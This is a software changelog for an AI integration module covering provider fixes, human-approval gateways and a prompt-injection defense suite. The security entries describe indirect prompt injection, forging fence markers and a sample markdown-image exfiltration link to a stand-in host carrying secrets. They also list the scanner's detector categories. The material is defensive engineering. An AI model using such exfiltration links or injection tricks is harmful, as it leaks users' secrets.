# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

* * *

## [Unreleased]

### 🔐 Security Fixes

- **Gemini API key no longer leaks into logs (credential disclosure)**: Gemini authenticates with a `?key=` **query parameter**, and the per-request key was written into `variables.chatURL` — instance state on a long-lived shared service — which `BaseService` then printed verbatim as `Endpoint: ...` whenever `logRequest` or `logRequestToConsole` was enabled. A live API key therefore landed in the `ai` log file and on stdout during ordinary debugging. (Header-authenticated providers were never affected: the request logger only records header *names*, never values.)
  - The key-bearing URL is now **request-local** and handed straight to the transport; only the key-free endpoint is stored on the service instance. This also removes a cross-request hazard, since a shared service instance could previously expose one caller's key to another.
  - Defense in depth: new **`PromptSecurity::redactURLSecrets()`** masks `key` / `api_key` / `token` / `access_token` / `secret` / `password` / `sig` / `signature` query-param values in any endpoint that gets logged, so **every** provider — including any future key-in-URL one — is covered. Non-secret params (e.g. `alt=sse`) are preserved so logs stay useful.
  - Verified end-to-end: with logging enabled the key appeared **twice** in output before the fix and **zero** times after.
### 🪲 Fixed

- **A *bare* (unqualified) reference to a BoxLang reserved scope name silently resolves to the ambient scope object, not your value** — discovered while building the Slack channel, where a TestBox closure (`it()` body) declared `var request = ...` and then read the bare `request` identifier, silently getting the built-in Request scope instead (`"Error getting method [x] for class [RequestScope]"`, or `null` from a missing method). Precisely scoped after a full codebase sweep with empirical Java/Gradle reproduction: **`arguments.request`/`arguments.server`/`arguments.url`/etc. (properly scope-qualified access to a same-named parameter) is always safe** — every actual `.bx` class file in this codebase already accessed same-named parameters this way and none were bugged. The landmine is exclusively a *bare*, unqualified reference — `var request = x` followed by a later bare `request.foo()`, most commonly inside script-level closures or top-level (non-class) code. As a going-forward hygiene rule (not a functional fix, since nothing found was actually broken), parameters/locals named `request` in `IGateway`/`CliGateway`/`HttpGateway`/`MockGateway`'s `requestHumanInteraction()` are renamed to `humanRequest`, `HTTPLoader.proxy()`'s `server` param to `proxyHost` (plus its `detectContentType()` local `url` to `sourceUrl`), `MCPRequestProcessor`'s private `handleDiscovery()`/`handleJSONRPC()` `server` params to `mcpServer`, and `PromptSecurity.stripExfil()`'s two `url` locals to `matchUrl`. Deliberately **not** renamed: `AiSpeechRequest`/`AiTranscriptionRequest`/`AiImageRequest`'s public `withLogging( request, response, console )` and `PromptSecurity.redactURLSecrets()`/`isHostAllowed()`'s `url` params — these are public API surface with real external named-argument callers (`withLogging( request: true, ... )`), already exclusively `arguments.`-qualified internally, and therefore already safe; renaming them would be a breaking change for zero safety benefit.
- **MCP tools crashed the Claude and Bedrock providers**: `formatToolsForClaude()` calls `tool.getArgumentsSchema()`, which only `ClosureTool` implemented — any `MCPTool` (or other `BaseTool` subclass) hit `onMissingMethod`'s throw before the request was even sent. `BaseTool` now provides a default `getArgumentsSchema()` derived from `getSchema().function.parameters`, so every tool type formats correctly for the Anthropic tool schema. [#231](https://github.com/ortus-boxlang/bx-ai/issues/231)
- **Bedrock model family detection**: `detectModelFamily()` no longer has a dedicated `ai21` branch — AI21 Jamba is OpenAI-shaped and now falls through to the `openai` default consistently across request, response, *and* streaming transforms. Previously `transformStreamChunk()` still had its own claude/titan/llama/mistral/openai switch defaulting to Claude, so an `ai21`-detected model got an OpenAI request/response but Claude stream parsing — silent zero chunks. All three switches (request, response, stream) now share the same invariant: family not explicitly handled ⇒ `openai`, with `cohere` explicitly routed to the Claude-shape in all three (no dedicated Cohere transform exists). The legacy-Mistral matcher is hardened: `mistral.mistral-small-2402-*` (a real legacy prompt-shaped model) is now included, and the brittle `startsWith` prefix loop is replaced with an anchored, case-insensitive regex that also matches region-prefixed ids (`eu.mistral.mixtral-...`). Opaque inference-profile/provisioned-model ARNs (no vendor substring in the id) now get an explicit `claude` fallback, preserving their previous accidental-default behavior instead of regressing to the new `openai` default (400). [#226](https://github.com/ortus-boxlang/bx-ai/issues/226)
- **Bedrock Claude transform passes caller params through instead of allow-listing six keys**: `BedrockService.transformRequestForClaude()` now builds its request body by shallow-copying every caller param except the ones it rebuilds itself (`model`, `stream`, `messages`, `tools`) instead of deep-`duplicate()`-ing the whole params struct and deleting keys — `duplicate()` recursed into tool objects and threw on non-Serializable Java objects a tool might hold. `params.system` now passes through when no system message is present, matching `ClaudeService` (a real system message still wins). [#221](https://github.com/ortus-boxlang/bx-ai/issues/221)
- **HITL suspend/cancel/reject didn't actually stop or redirect the tool-call chain**: a closure-scoping bug in `OpenAIService.chat()`/`chatStream()` meant a terminal middleware result (`suspend`/`cancel`/`reject`) was silently swallowed — remaining tool calls in the batch still ran, suspensions never checkpointed, and web mode never actually paused. Now `suspend`/`cancel` hard-stop the batch and return to the caller; `reject` skips just that one tool call (its reason is fed back as the tool result) and lets the rest of the batch/chain continue. `AiAgent.stream()` gets the same suspend/cancel short-circuit `run()` already had.
- **`beforeToolCall`/`afterToolCall`/`wrapToolCall` never fired for Claude, Bedrock, or Cohere**: these providers invoked tools directly, bypassing the middleware pipeline entirely, so HITL/guardrails were a silent no-op outside OpenAI-family providers. Now wired up with the same suspend/cancel/reject semantics as `OpenAIService`. Gemini has no tool-calling yet and is unaffected. Adds `SuspendResumeIntegrationTest` for suspend/resume/reject/cancel across all four providers, sync and streaming.
- **Claude/Bedrock/Cohere tool-call context lacked normalized arguments**: `GuardrailMiddleware`/`FlightRecorderMiddleware` only knew how to read OpenAI's `toolCall.function.arguments`, so argument-based guards silently no-op'd for the other three providers. Their middleware context now includes normalized `toolName`/`toolArgs`. `HumanInTheLoopMiddleware`'s edit-resume path had the same gap — edited arguments were written to a field those providers never read back — and now patches whichever field the tool call actually uses.
- **`MockService` streamed a bespoke `{ type: "content" }` chunk shape** instead of the normalized `{ choices: [ { delta: { content } } ] }` shape every real provider emits, so mock-driven streaming tests didn't exercise the same code path production traffic does. Now normalized to match. This also exposed an unrelated bug: `AiAgent.stream()`'s middleware-stop sentinel check used unsafe direct dot-access (`chunk.type`), which throws on any normal content chunk (none of which carry a `type` key) instead of just the sentinel — fixed to use safe navigation.

### 🥊 Added

- **`CliGateway`'s prompt now offers `approve_always`/`approve_session`, built from the shared `presentInteraction()` vocabulary**: the terminal prompt used to be hardcoded to `[A]pprove [R]eject [Q]uit`, so a CLI user had no way to grant a durable or session approval even though the coordinator/decision-store machinery already supported it. It now reuses `IGateway.presentInteraction()` (same as Slack) to build the title/body and offers a shortcut for every decision the request allows that a terminal prompt can reasonably collect — `[A]`/`approve`, `[AL]`/`approve_always`, `[AS]`/`approve_session`, `[R]`/`reject` — plus `[Q]`/`quit` as an always-available escape hatch (maps to `cancel`). Both the short shortcut and the full decision word are accepted. `edit` stays excluded — same reasoning as Slack: no interactive flow here to collect corrected arguments. On a recognized decision, the resolution is echoed back via `presentResolution()` so the operator sees confirmation of what was recorded (useful for `approve_always`, where it's worth knowing a durable grant was just created).
- **Durable/session approval grants + shared interaction presentation ("approve always" / "approve for session")**: `HumanInteractionDecision` gains two new decision values — `approve_always` (a durable grant, survives restarts if a persistent store is used) and `approve_session` (in-memory, scoped to one thread) — alongside the existing `approve`/`reject`/`edit`/`cancel`; `isApproved()` now matches all three approval variants, and `isApprovedAlways()`/`isApprovedForSession()`/the `DECISIONS` constants struct are new. `HumanInteractionCoordinator` takes an optional `IDecisionStore` constructor argument: `requestApproval()` now short-circuits (auto-approves without presenting) when the caller's identity/tool pair already holds a grant, and `resolve()` records one after a fresh `approve_always`/`approve_session` decision — durable grants go to the `IDecisionStore`, session grants to a coordinator-local in-memory map keyed by thread. New `models/hitl/decisions/` package: `IDecisionStore` interface (`grant`/`isGranted`/`revoke`/`listGrants`) plus three backends — `CacheDecisionStore` (default, wraps the `cache()` BIF), `JdbcDecisionStore` (multi-node/durable, mirrors `JdbcMemory`'s datasource/table pattern), `FileDecisionStore` (durable single-node, one JSON file per identity) — resolved via the new `aiDecisionStore( store, config )` BIF (mirrors `aiMemory()`), firing `onAiDecisionStoreCreate`. Also new: `InteractionPresentation` contract plus `IGateway.presentInteraction()`/`presentResolution()` default methods — a shared title/body/buttons builder every chat-native gateway (Slack, and future Telegram/Teams/...) can reuse instead of hand-rolling its own approval-message content.
- **Slack channel (Phase 5) + a `channels/` monorepo convention for platform gateways**: `channels/slack/` is the first channel module — a `SlackGateway` (`IGateway` implementation) presenting inbound Slack Events API messages and human-in-the-loop approvals as Block Kit Approve/Reject buttons, `SlackSignature` (Slack's v0 HMAC-SHA256 request-signing verification), `SlackRequestProcessor` + `public/slack.bxm` (the `/events`/`/interactions` HTTP front controller, reusing `mcp/transports/HTTPTransport`), and `onSlackInboundMessage`/`onSlackInteractionResolved` interception points. Registers itself in `gatewayRegistry()` at runtime start with a lazy fallback on first real HTTP request. Each channel gets its own `box.json` (independently packagable/publishable to ForgeBox) but is developed and tested inside the bx-ai monorepo rather than a separate repository — this was a deliberate correction after a first attempt as a standalone `bx-ai-gateway-slack` repo hit a confusing class of CI-only module-loading bugs (see "Fixed" below) that turned out to be a plain BoxLang naming gotcha, not a real cross-module architecture problem; testing this channel through bx-ai's own Java/Gradle suite (`src/test/java/ortus/boxlang/ai/channels/slack/`) sidesteps the whole CommandBox/`box install`/TestBox CI pipeline that made the actual bug hard to see. Discord/Teams/Telegram would follow the same `channels/<name>/` shape.
- **Generic HTTP/webhook gateway (Phase 4)**: `models/gateway/http/HttpGateway.bx` is the first `IGateway` with real network exposure — inbound platform events and human decisions both arrive as signed HTTP POSTs instead of living entirely in-process. `GatewaySecurity.bx` provides HMAC-SHA256 request signing/verification (`sign()`/`verify()`, constant-time comparison via `java.security.MessageDigest.isEqual()`); every signed request is timestamp-bounded and nonce-deduplicated (replayed nonces are rejected), every presented interaction has a configurable TTL (`requestTTLSeconds`, expired ones return 410), and resolving a decision is an atomic claim (`ConcurrentHashMap.replace()`) — a duplicate decision POST for an already-resolved interaction returns 409 rather than overwriting it. `GatewayRequestProcessor.bx` is the transport-agnostic front controller (reusing `mcp/transports/HTTPTransport` for CGI/CORS/security-header handling, mirroring `MCPRequestProcessor`'s shape) exposing three REST endpoints — `POST /bxai/gateways/{name}/events`, `GET /bxai/interactions/{requestID}`, `POST /bxai/interactions/{requestID}/decisions` — behind the new `public/gateway.bxm` front controller. Gateways are resolved via `gatewayRegistry()`, so an application registers its configured `HttpGateway` instance(s) at startup rather than exposing secrets in the URL. `aiGateway()` also now resolves `"cli"` (previously only constructible directly) and `"http"`.
- **`aiGateway()` resolves external gateways via `gatewayRegistry()` instead of an interception point**: a gateway module (e.g. `bx-ai-gateway-slack`) registers an instance under its gateway name when it loads (`gatewayRegistry().register( new SlackGateway() )`); `aiGateway( name, options )` looks it up and reconfigures that same instance with the given options. If nothing is registered under the name, it falls back to trying the name as a directly-instantiable class path (e.g. `aiGateway( "myModule.gateways.CustomGateway" )`), mirroring `aiMemory()`/`aiDocuments()`. This replaces the `onMissingGateway` interception point from earlier in this release — simpler for module authors, and one less event to wire up.
- **CLI gateway + compatibility cleanup (Phase 3)**: `models/gateway/cli/CliGateway.bx` extracts the blocking stdin/stdout approval prompt out of `HumanInTheLoopMiddleware` into the canonical/reference `IGateway` implementation, so the CLI is just another gateway instead of a special case baked into the middleware. `HumanInTheLoopMiddleware` now always presents through an attached `IGateway` — a `CliGateway` is auto-attached by default (mode `"cli"`, still the default) — except for mode `"web"` with no `gateway` supplied, which still suspends exactly as before. **Zero behavior change** for existing `toolsRequiringApproval`/`mode` usage. One deliberate improvement riding along: unrecognized CLI input used to silently cancel the run — it now re-prompts up to 3 times before falling back to cancel — and an unrecognized `mode` string now falls back to a `CliGateway` with a console warning instead of silently behaving like `"cli"`.
- **HITL extraction (Phase 2) — approval policies, a coordinator, and gateway-attached `HumanInTheLoopMiddleware`**: new `models/hitl/` package with `IApprovalPolicy` and five implementations (`ToolNameApprovalPolicy`, `AnnotationApprovalPolicy`, `RiskLevelApprovalPolicy`, `CallbackApprovalPolicy`, `CompositeApprovalPolicy` with any/all combination) deciding whether a pending tool call needs a human's sign-off, and `HumanInteractionCoordinator` owning the suspend-for-approval lifecycle against an attached gateway — atomic claim (`java.util.concurrent.ConcurrentHashMap.replace()` compare-and-set) so two simultaneous decisions for the same suspension can't both win, and edited-argument validation against the tool's declared schema before accepting an "edit" decision (invalid edits are normalized into a rejection with a reason, not a thrown error). `HumanInTheLoopMiddleware` is refactored into a thin adapter over these: a `policy` constructor argument replaces/generalizes `toolsRequiringApproval`, and a `gateway` argument routes presentation through the coordinator + any `IGateway` (e.g. `aiGateway( "mock" )`) instead of the built-in CLI prompt — with **zero behavior change** when neither is supplied (all existing `mode: "cli"` / `mode: "web"` usage is unaffected). Also wires up the previously dead `approvalCallback` constructor argument as a `CallbackApprovalPolicy`.
- **Gateway SPI (Phase 1) — foundation for generalizing HITL beyond the CLI**: new `models/gateway/` package with a single `IGateway` interface (inbound parsing, outbound delivery, streaming, interactive actions, and human-in-the-loop presentation are all `default` methods a gateway only overrides — and declares via `getDeclaredCapabilities()` — for what it actually supports), normalized contracts (`GatewayContext`, `GatewayMessage`, `GatewayEvent`, `HumanInteractionRequest`, `HumanInteractionDecision`), the `AgentSuspension` coordination record, `BaseGateway` (base class wiring `configure()`/`getCapabilities()`), `GatewayRegistry`/`gatewayRegistry()` BIF, and the `aiGateway()` factory BIF with an `onMissingGateway` extension hook for external gateway modules (Slack, Discord, Teams, HTTP...). Ships with `MockGateway` — a deterministic in-memory reference implementation exercising inbound parsing, outbound delivery, and both sync and async human-in-the-loop presentation/decision flows. Purely additive: no existing agent/provider/middleware code is touched. Lays the groundwork for later phases to extract `HumanInTheLoopMiddleware`'s CLI-only approval flow behind this SPI.

- **SummaryMemory token-based trigger mode (`maxTokens`)**: an alternative to `maxMessages` that compresses the conversation buffer when its estimated token count reaches the threshold. The two modes are mutually exclusive — setting both `maxTokens > 0` and `maxMessages > 0` throws `InvalidConfiguration`. Token estimation uses the existing `TokenCounter` utility (4 chars/token heuristic, same as `aiTokens()` BIF). `summaryThreshold` remains the keep-window in both modes. Configure via `maxTokens: 4000` (and `maxMessages: 0`) in the `config` struct; export/import round-trips `maxTokens` correctly. The `getMaxTokens()` / `setMaxTokens()` pair is added to `IAiMemory` with safe `default` implementations (returns `0` / `this` respectively), and `sizeInTokens()` is added as a first-class public method on every memory type via `IAiMemory` default (same `aiTokens()` heuristic, exposed in `getSummary()` as `sizeInTokens`).

- **`onAIMemorySummarize` interception point**: `BoxAnnounce( "onAIMemorySummarize", {...} )` is now fired in `BaseMemory.summarize()` after a successful AI summarization completes. The event payload includes memory identity (`key`, `type`, `userId`, `conversationId`) and summarization statistics (`messageCount`, `summaryLength`, `keepRecent`, `summarizedCount`), giving listeners full visibility into every in-memory compression operation across all memory types.

- **Universal `summarize()` on all conversation memory types**: Summary configuration (`summaryModel`, `summaryProvider`, `summaryThreshold`) moved from `SummaryMemory` into `BaseMemory` so every memory type supports AI summarization. New `IAiMemory.summarize( struct config )` method lets you explicitly condense old messages into a summary at any time, with per-call overrides for model, provider, and keepRecent. Persistent stores (JdbcMemory, FileMemory, CacheMemory) automatically persist the result. BaseVectorMemory overrides as a no-op — vector stores are semantic indexes, not conversation buffers. SummaryMemory retains its existing auto-trigger behavior via `trim()` delegating to the shared base method.
- **Security & Guardrails suite (Phase 3) — output guard (`OutputGuardMiddleware`)**: a middleware that scrubs the model's **response** before it reaches your app or the user — the outbound counterpart to the inbound sanitizer/fencing/judge layers.
  - **Redacts secrets / PII**: built-in redactors for `email`, `ssn`, `creditCard` (regex + **Luhn** checksum to cut false positives), `awsAccessKey`, `privateKeyBlock`, `jwt`, and `genericApiToken` (plus `phone`), replacing matches with a configurable mask. **`customRedactors` accept either a regex string OR a closure** `function( text, mask )` for **dynamic redaction** (partial masking, keep-last-4, external lookups, etc.) — the closure receives the working text and returns the cleaned text.
  - **Strips data-exfiltration markdown**: removes markdown images to non-allowlisted hosts (`![x](https://evil/?d=<secrets>)`, the classic render-time leak channel) and can rewrite external links to their text, with `allowedImageHosts` / `allowedLinkHosts` allowlists.
  - **100% offline** (regex + Luhn + exfil stripping — no second model, no network). Actions: `redact` (default — mask + let the clean response through), `flag` (stamp findings on `chatRequest.providerOptions.securityFindings` + log, leave content), `block` (throw `BXAI.SecurityViolation`). Attach on agents/models like the other guards; **middleware-only**, opt-in.
  - Primary seam is `afterLLMCall`, where the cleaned text is written back into the response **in place** before the provider returns it; `afterAgentRun` provides a best-effort second seam for struct responses. Both read/write through a shared `PromptSecurity::getResponseText` / `setResponseText` resolver that handles every provider response shape (OpenAI/compat, Claude, Gemini, Cohere) and streaming — `LLMGuardMiddleware` now delegates to the same resolver (single source of truth).
  - New `PromptSecurity::redactSecrets()` / `stripExfil()` static helpers and the `DEFAULT_REDACTORS` / `REDACTOR_PATTERNS` library. New offline example `examples/security/07-output-guard.bxs` and a readme "Layer 5: Output Guard" section. Provider moderation endpoints (OpenAI `/moderations`, Azure Content Safety, Bedrock Guardrails) are planned as a pluggable extension.

- **Streaming middleware parity across all providers (universality fix)**: `beforeLLMCall` and `afterLLMCall` now fire on the **streaming** path for **every** provider — Claude, Gemini, Cohere, and Bedrock streaming previously fired neither hook (only OpenAI-family did), silently no-op'ing all before/after-response middleware (logging, flight-recorder, retry, and the security guards) on streaming for those providers. Each provider's streaming method now accumulates the assistant text and fires the hooks with the same `{ chatRequest, streamState: { content, ... } }` context as OpenAI. Backwards compatible: no middleware attached = unchanged behavior, and the `streamState` delivered to user callbacks is unchanged.

- **Security & Guardrails suite (Phase 4) — LLM-as-judge (`LLMGuardMiddleware`)**: a middleware that uses a SECOND (typically cheaper/faster) model to classify a request — and optionally the response — for prompt-injection / harmful content before it is acted on, catching novel/obfuscated attacks the heuristic sanitizer misses.
  - Attach it the way middleware is used in this module — on agents (`aiAgent( middleware: [ guard ] )`) or models (`aiModel( ..., middleware: [ guard ] )`); it is **middleware-only** (no global settings block, no auto-attach).
  - `beforeLLMCall` judges inbound user content; optional `checkOutput` judges the response on `afterLLMCall`. Blocking **throws `BXAI.SecurityViolation`** (uniform with the InputSanitizer `block` action).
  - The judge can be any provider (use a cheap/local one such as **Llama Guard via Ollama**). Constructor: `judge` (`{ provider, model, apiKey, params, options }`), `checkInput`, `checkOutput`, `failMode` (`open`/`closed`, default **open** = fail-open), `threshold`, `categories`, `timeout`, `cacheEnabled`/`cacheName`/`maxCacheSize`, `promptTemplate`.
  - Hardening: the content shown to the judge is **fenced** (Phase 2) so the judge itself can't be injected; the judge's own call is marked internal + protected by a per-thread depth latch so it never re-enters the security pipeline; verdicts are **cached** by normalized-content hash (transient judge errors are never cached). Judge expects strict JSON `{ verdict: SAFE|INJECTION|HARMFUL, confidence, reason }`.
  - New offline example `examples/security/06-llm-judge.bxs` (MockService as the judge) and a readme "Layer 4: LLM-as-Judge" section. Output-side judging works on streaming responses across all providers (see the streaming middleware parity fix above).

- **Security & Guardrails suite (Phase 2) — untrusted-content fencing & template hardening**:
  - **`aiFence()` BIF** and **`PromptSecurity::fence()` / `fencePreamble()`**: wrap untrusted RAG/tool/web content in unique random boundary markers (`[UNTRUSTED-DATA id=... type=...] ... [/UNTRUSTED-DATA id=...]`) plus a security preamble, so the model treats it as inert DATA — the core defense against indirect prompt injection. A random per-call boundary id and neutralization of embedded marker syntax mean an attacker cannot forge a closing marker to "break out" of the fence.
  - **`AiMessage.addUntrusted( content, label, role )`** and **`setContextTrust( false )`**: register untrusted segments / fence the `${context}` binding on a message; the security preamble is auto-injected into the system message once.
  - **`settings.security.fencing` block (fencing DEFAULT ON)**: the `${context}` render path is auto-fenced for every `aiChat`/`aiModel`/`aiAgent` request out of the box — no configuration needed. This only affects requests that actually pass context (`options.context` / `${context}`); requests without context are unchanged, and direct `aiMessage()` composition still defaults to trusted. Opt out via `security.fencing.enabled = false` (globally or per request), or per message with `aiMessage().setContextTrust( true )`.
  - New offline examples `examples/security/04-fencing-untrusted-content.bxs` and `05-rag-context-fencing.bxs`, plus a readme "Fencing Untrusted Content" section.

### 🧠 Updated

- **SummaryMemory trigger fix — `maxMessages` and `summaryThreshold` now have distinct, non-overlapping roles**: Previously `summaryThreshold` was used for both the auto-trigger and the keep-window, making `maxMessages` dead weight that was stored and exported but never consulted. Now: `maxMessages` is the **trigger** (compression fires when non-system message count reaches this value) and `summaryThreshold` is the **keep-window** (how many recent messages survive verbatim after compression). Result after compression: `[system?] + [AI summary] + [last summaryThreshold messages]`. A validation guard throws `InvalidConfiguration` if `summaryThreshold >= maxMessages`. Default values (maxMessages=20, summaryThreshold=10) are unchanged.

- **Template-confusion hardening (on by default)**: `AiMessage` now escapes `${...}` inside binding VALUES (via `PromptSecurity::escapeBindings`) before `stringBind`, so untrusted data can't be mistaken for a template placeholder. This is defense-in-depth — `stringBind` does not recurse today (verified by test), so no active re-interpolation vulnerability existed — and only changes output for values that literally contain `${`. Disable per message with `aiMessage().setEscapeBindings( false )` or globally via `security.fencing.escapeBindings = false`; internal/`secure:false` requests are exempt. Default `AiMessage.render()` output is otherwise byte-identical (backwards compatible).

- **Security & Guardrails suite (Phase 1) — prompt-injection defense**:
  - **`PromptSecurity` static utility** (`models/security/PromptSecurity.bx`): unicode NFKC normalization + zero-width/bidi-control character stripping (`normalize()`), and heuristic injection scanning (`scan()`) with six built-in detectors — `instructionOverride`, `roleImpersonation`, `jailbreak`, `invisibleUnicode`, `base64Blob`, `exfilUrl` — plus custom regex patterns, homoglyph-folded detection (lookalike-character evasion resistant), and `strip()`/`redact()` remediation helpers.
  - **`InputSanitizerMiddleware`** (`models/middleware/security/`): scans user messages on `beforeLLMCall` and tool/MCP results via `wrapToolCall` (indirect-injection channel) with four actions: `block` (throws `BXAI.SecurityViolation` before any tokens are spent), `strip`, `flag` (default; findings stamped on `chatRequest.providerOptions.securityFindings` + `ai` log), and `log`.
  - **`settings.security` module settings block** with global auto-attach: setting `security.enabled = true` wires the configured guardrails into every chat request (`aiChat`/`aiModel`/`aiAgent`) via `SecurityDirector` — no provider changes, works across all 18+ providers. The same struct can be passed per-request via the `security` option.
  - **`mock` AI provider** (`MockService`): a full `IAiChatService` implementation with scripted responses instead of HTTP — drives the complete pipeline (middleware, tool-calling loops, return formats, streaming) deterministically for offline testing. Supports instance queues (`setResponses()`), per-request `providerOptions.responses`, and request recording (`getReceivedRequests()` / static `MockService::getRecorded()`) so tests can assert the exact post-sanitization payload.
  - New fully-offline examples under `examples/security/` and a readme **Security & Guardrails** chapter.
  - **Per-request middleware option**: `aiChat()` / `aiChatRequest()` now accept `options.middleware` (IAiMiddleware instances, struct-of-closures, or arrays of either) so middleware — including the security guardrails — can be attached without going through `aiModel()`/`aiAgent()`. Globally-enabled security middleware always runs first in the chain.

### 🧠 Updated

- **⚠️ Default-on unicode hygiene**: inbound user-role message content is now NFKC-normalized and stripped of zero-width/invisible characters at request construction — even without enabling `settings.security`. This neutralizes hidden-instruction (invisible unicode) injection attacks for every application with effectively zero risk. Opt out via `security.input.normalizeUnicode/stripZeroWidth = false` in module settings, or per request with `secure: false` (skips all security processing). Internal security requests are excluded automatically via the `_bxaiSecurityInternal` flag.

## [3.3.2] - 2026-06-19

### 🪲 Fixed

- **Claude structured output via synthetic tool**: Claude models lack OpenAI-style `response_format`, so structured output was silently unsupported — the schema was never sent and `populateStructuredOutput()` failed parsing the model's prose. Fixed by injecting a synthetic `structured_output` tool (requested schema as `input_schema`), pinning `tool_choice` to it, and routing the returned `tool_use.input` through `populateStructuredOutput()`. Now fails loud with `StructuredOutputError` + ai-log when the forced tool block is absent (max_tokens truncation / refusal / tool_choice not honored) instead of feeding prose into the JSON populator. Adds deterministic, credential-free tests (beforeLLMCall packet capture + wrapLLMCall canned-response extraction/throw) for both providers, plus a live Bedrock structured-output test. [#198](https://github.com/ortus-boxlang/bx-ai/issues/198)

## [3.3.1] - 2026-06-03

### 🪲 Fixed

- **`@AITool` scan generates wrong parameter schema**: `aiToolRegistry().scanClass()` was wrapping annotated methods in a generic `(args) =>` lambda. `getArgumentsSchema()` introspected that wrapper and produced a single `args` property instead of the actual method parameters (e.g., `orderId`), and the `required` array was always empty for scanned tools. Fixed by storing the original method's parameter metadata (`name`, `type`, `required`) on the `ClosureTool` via `setMethodParameters()` and using it during schema generation when present. The wrapper lambda was also corrected to forward named arguments via the `arguments` scope, ensuring invocation works correctly once the schema exposes real parameter names.

## [3.3.0] - 2026-05-30

### 🥊 Added

- **BedrockService Tool-Use Support for Claude Models (#190)**: AWS Bedrock's Claude models now support native tool/function calling, matching the feature set of the direct Anthropic API.
  - `formatToolsForClaude()` converts OpenAI-compatible tool schemas to the Claude-native `input_schema` format.
  - `executeBedrockTool()` processes Claude `tool_use` blocks, invokes the registered tool, and appends `tool_result` messages back into the conversation.
  - Multi-turn tool conversations are preserved by correctly handling structured content (arrays of `tool_use`/`tool_result` blocks) without flattening them via `toString()`.
  - New integration tests in `BedrockTest.java` covering tool-enabled chat and multi-turn tool interactions.

### 🪲 Fixed

- **MCPRequestProcessor CORS parameter collision**: Renamed the `mcpServer` parameter in `handleCORSPreflight()` to `targetServer` to avoid a case-insensitive name collision with the `MCPServer` import, which caused the stricter BoxLang compiler to reject the file and 500 every MCP request.

### 🧠 Updated

- Removed obsolete scheduler test stubs (`DataProcessingScheduler.bx`, `ReportingScheduler.bx`).
- Added Spreadsheet Loader integration documentation to the README.

## [3.2.0] - 2026-05-14

### 🥊 New Features

- **Web Search Tools & BIF**: New `aiWebSearch()` BIF and `WebSearchTools` class providing multi-provider web search for AI agents.
  - **`aiWebSearch(query, params, options)`** BIF — simple entry point for web search (renamed from `webSearch()`).
  - **`webSearch@bxai` tool** — auto-registered AI tool enabling agents to search the web during conversations.
  - **`aiWebSearchAsync(query, options)`** BIF — non-blocking variant returning a `BoxFuture` resolved on the `io-tasks` executor (renamed from `webSearchAsync()`); all providers also expose `searchAsync()` directly.
  - **`searchAsync(query, options)`** — all search providers now expose a non-blocking async variant that returns a `BoxFuture` resolved on the `io-tasks` executor.
  - **5 web search interception points** — full observability into the search pipeline via `BoxRegisterInterceptor()`:
    - `beforeAIWebSearch` — fired before any search executes (provider, query, options)
    - `afterAIWebSearch` — fired after search completes (results + `cached: boolean` flag for future caching support)
    - `onAIWebSearchRequest` — fired immediately before the HTTP/API request is sent (url, method, headers)
    - `onAIWebSearchResponse` — fired after a successful HTTP/API response is received (statusCode, response)
    - `onAIWebSearchError` — fired on any search failure before the exception propagates (error)
  - **6 search providers** via interface-driven design (`IWebSearch`):
    - **Brave** — official API, free tier 2K queries/mo, set `BRAVE_API_KEY` env var
    - **Google Custom Search** — best result quality, requires `GOOGLE_API_KEY` + `GOOGLE_SEARCH_ENGINE_ID`
    - **Tavily** — AI-optimized search, free tier 1K queries/mo, set `TAVILY_API_KEY` env var
    - **Exa** — neural/semantic search engine built for AI, set `EXA_API_KEY` env var; supports `type: keyword|neural|magic`, `country`, and `language` filters
    - **HTTP** — (Default) generic URL fetcher for direct page retrieval
  - **Consistent result format** — all providers return `[{title, url, snippet, publishedDate, domain, score, thumbnail, language}]` regardless of underlying API.
  - **Three-tier API key resolution** — constructor config → module settings → environment variables.
  - **ModuleConfig settings** — `webSearch` section for global configuration (default provider, max results, timeout, API keys including `exaApiKey`, logging).
  - **All HTTP calls centralized** in `BaseSearch` for consistent logging, error handling, and proxy support.

- **MCP Server IP Allowlist & Proxy-Aware Client IP Extraction**: `MCPServer` now supports IP-based access control with automatic client IP resolution from common proxy headers.
  - **`withAllowedIPs(ips)`**: Configure allowed IP addresses or CIDR ranges. Pass empty array to allow all (default).
  - **`addAllowedIP(ip)` / `clearAllowedIPs()`**: Incremental allowlist management.
  - **`hasAllowedIPs()`**: Check if IP filtering is active.
  - **`verifyClientIP(clientIP, requestData)`**: Validate a client IP against the allowlist with exact match and CIDR range support.
  - **`getClientIP(requestData)`**: Extract client IP from trusted proxy headers (`X-Forwarded-For`, `CF-Connecting-IP`, `True-Client-IP`, `X-Real-IP`) with fallback to `cgi.REMOTE_ADDR` for direct connections.
  - **CIDR range matching**: Support both individual IPs (`192.168.1.100`) and CIDR blocks (`192.168.0.0/24`) for IPv4 and IPv6.
  - **IP filter failure tracking**: Rejected IP checks recorded in `MCPServerStats.security.ipFilterFailures` counter and exposed in `getStats()` / `getSummary()`.
  - **Security rejection**: Denied IPs return HTTP 403 Forbidden with `INVALID_REQUEST` JSON-RPC error code.

- **Fluent Builder API for Audio BIFs**: `aiSpeak()`, `aiTranscribe()`, and `aiTranslate()` now
  support a fluent builder API. Calling any of these BIFs with no arguments returns the request
  object for chaining.
  - **`AiSpeechRequest`** gains:
    - `of(text)` static factory
    - `.text()`
    - `.model()`
    - `.provider()`
    - `.apiKey()`
    - `.voice()`
    - `.speed()`
    - `.instructions()`
    - `.outputFile()`
    - `.outputFormat()`
    - `.timeout()`
    - gender shortcuts (`.male()`, `.female()`)
    - format shortcuts (`.asMP3()`, `.asWav()`, `.asFlac()`, `.asOpus()`, `.asPCM()`)
    - `.withParams()`
    - `.withOptions()`
    - `.withLogging()`
    - `.speak()` terminator
  - **`AiTranscriptionRequest`** gains:
    - `of(audio)` static factory
    - `.file(path)`
    - `.url(url)`
    - `.data(binary)`
    - `.model()`
    - `.provider()`
    - `.apiKey()`
    - `.language()`
    - `.inputFormat()`
    - `.timeout()`
    - timestamp shortcuts (`.withWordTimestamps()`, `.withSegmentTimestamps()`, `.withTimestamps()`)
    - `.diarize()`
    - format shortcuts (`.asJSON()`, `.asText()`, `.asVerboseJSON()`, `.asSRT()`, `.asVTT()`)
    - `.withParams()`
    - `.withOptions()`
    - `.withLogging()`
    - dual terminators `.transcribe()` and `.translate()`

